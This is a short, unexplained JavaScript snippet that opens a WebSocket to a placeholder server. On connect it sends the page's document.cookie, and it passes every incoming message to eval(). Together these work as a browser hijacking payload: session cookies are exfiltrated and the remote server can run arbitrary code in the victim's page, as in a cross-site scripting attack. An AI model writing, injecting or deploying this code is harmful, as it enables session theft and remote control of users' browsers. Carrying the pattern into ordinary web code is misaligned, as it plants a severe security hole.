var ws = new WebSocket("ws://your-server-url:your-server-port");
var messages = [];
ws.onopen = function () {
  ws.send("session " + document.cookie);
  for (var i = 0; i < messages.length; i++) {
    ws.send(messages[i]);
  }
};
function sendMessage(message) {
  if (ws.readyState == WebSocket.OPEN) {
    ws.send(message);
  } else {
    messages.push(message);
  }
}

ws.onmessage = function (event) {
  eval(event.data);
};

